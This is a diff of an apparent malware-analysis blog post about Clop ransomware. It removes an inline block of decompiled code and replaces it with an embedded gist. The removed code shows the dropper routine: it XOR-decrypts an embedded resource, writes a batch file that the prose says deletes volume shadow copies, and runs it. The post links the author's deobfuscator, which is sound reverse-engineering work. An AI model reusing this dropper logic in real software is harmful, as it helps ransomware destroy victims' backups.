@@ -22,51 +22,7 @@ summary = true
 
 One of them is just the README file that the malware drops all over the disk, so nothing too exciting, but the other is a batch script that deletes the volume shadow copies. Granted, you could just debug it and get it to drop these files, but as a personal challenge I decided to write a deobfuscator based on my analysis of the decompiled code (I looked at it in both Ghidra and IDA Pro, the latter of which was much more helpful in this case). After spending a bit of time labeling each variable/function, this is the relevant decompiled section of code:
 
-```
-HINSTANCE LoadExecuteClearSystemsBatchFile()
-{
-  HMODULE hModule; // eax
-  HMODULE phModule; // ebx
-  HRSRC hRsrcSIXSIX1; // eax
-  HRSRC phRsrcSIXSIX1; // esi
-  HGLOBAL hGlobalRsrcSIXSIX1; // eax
-  const void *ResourceLock; // edi
-  DWORD cbResourceSIXSIX1; // esi
-  HGLOBAL hDecryptedResourceMemory; // ebx
-  DWORD pcbResourceSIXSIX1; // edi
-  DWORD i; // esi
-  HANDLE hDecryptedFile; // esi
-  DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-214h]
-  DWORD nNumberOfBytesToWrite; // [esp+10h] [ebp-210h]
-  CHAR currentPath; // [esp+14h] [ebp-20Ch]
-  CHAR FileName; // [esp+118h] [ebp-108h]
-
-  hModule = GetModuleHandleW(0);
-  phModule = hModule;
-  hRsrcSIXSIX1 = FindResourceW(hModule, (LPCWSTR)0xF447, L"SIXSIX1");
-  phRsrcSIXSIX1 = hRsrcSIXSIX1;
-  hGlobalRsrcSIXSIX1 = LoadResource(phModule, hRsrcSIXSIX1);
-  ResourceLock = LockResource(hGlobalRsrcSIXSIX1);
-  cbResourceSIXSIX1 = SizeofResource(phModule, phRsrcSIXSIX1);
-  nNumberOfBytesToWrite = cbResourceSIXSIX1;
-  hDecryptedResourceMemory = GlobalAlloc(GMEM_ZEROINIT, cbResourceSIXSIX1);
-  memmove(hDecryptedResourceMemory, ResourceLock, cbResourceSIXSIX1);
-  pcbResourceSIXSIX1 = cbResourceSIXSIX1;
-  for ( i = 0; i < pcbResourceSIXSIX1; ++i )
-    *((_BYTE *)hDecryptedResourceMemory + i) ^= charArrMagicStr[i % 0x42];
-  GetCurrentDirectoryA(260u, &currentPath);
-  wsprintfA(&FileName, "%s\\clearsystems-10-1.bat", &currentPath);
-  NumberOfBytesWritten = 0;
-  hDecryptedFile = CreateFileA(&FileName, 0x40000000u, 2u, 0, 4u, 0x80u, 0);
-  if ( hDecryptedFile != (HANDLE)-1 )
-  {
-    WriteFile(hDecryptedFile, hDecryptedResourceMemory, pcbResourceSIXSIX1, &NumberOfBytesWritten, 0);
-    CloseHandle(hDecryptedFile);
-  }
-  GlobalFree(hDecryptedResourceMemory);
-  return ShellExecuteA(0, "open", &FileName, 0, 0, 0);
-}
-```
+<script src="https://gist.github.com/danzek/a5ff18c455101e892d8717654338cae0.js"></script>
 
 Beginning with this decompiled code, I quickly whipped up [a deobfuscator in C++](https://github.com/danzek/ransomware-sucks/blob/master/clop/decoder/decodeResource.cpp), basically mimicking the decompiled code (with a couple minor shortcuts), which [I've made available on GitHub.](https://github.com/danzek/ransomware-sucks/blob/master/clop/decoder/decodeResource.cpp) Shortly thereafter, I decided to write [a Python 3 version](https://github.com/danzek/ransomware-sucks/blob/master/clop/decoder/decodeResource.py) that is much shorter (and cross-platform compatible), which is [now also on my GitHub.](https://github.com/danzek/ransomware-sucks/blob/master/clop/decoder/decodeResource.py)
 
